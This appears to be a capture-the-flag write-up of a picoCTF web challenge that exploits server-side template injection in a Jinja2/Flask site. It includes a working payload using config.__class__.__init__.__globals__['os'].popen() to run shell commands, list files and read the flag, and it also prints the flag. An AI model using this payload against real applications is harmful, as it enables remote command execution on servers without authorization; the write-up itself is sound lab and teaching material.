## 👉 Challenge Overview:

**● Category: Web Exploitation**\
**● Difficulty: Easy**\
**● Vulnerability: Server-Side Template Injection (SSTI)**

## 🔎 Initial Reconnaissance:
When you visit the website, you see:

● Title: "Home"\
● Message: "I built a cool website that lets you announce whatever you want!*"\
● Input field asking: "What do you want to announce:"\
● Note at bottom: "*Announcements may only reach yourself"

This immediately suggests the input is being reflected back to you, making it a prime candidate for template injection.

## 👉 Step 1: Confirming SSTI Vulnerability
First, test with basic math expression:\
● Input: {{7*7}}\
● Output: 49 (vulnerable)\
So the application is processing template syntax.

## 👉 Step 2: Identifying the Template Engine
Since this syntax {{}} works, it's likely using Jinja2 (Python/Flask).\
● Input: {{7*'7'}}\
● Output: 7777777  # Confirms Jinja2

## 🚀 Step 3: Exploitation - Directory Listing
● Input: {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}\
● Output: __pycache__ app.py flag requirements.txt

## 🚩 Flag:
● Input: {{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}\
● Output: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}

## ⛓️‍💥 Breaking down this payload:

● config - Flask configuration object. (available in Jinja2 context)\
● .__class__ - Gets the class of config object.\
● .__init__ - Access the initializer method.\
● .__globals__ - Access global namespace.\
● ['os'] - Get the os module from globals.\
● .popen('ls') - Execute the 'ls' command.\
● .read() - Read the command output.

## 🤔 Why This Works:
The vulnerability exists because:

● User input is directly passed to render_template_string() without sanitization.\
● No sandboxing is implemented.\
● Jinja2 allows access to Python objects through its syntax.
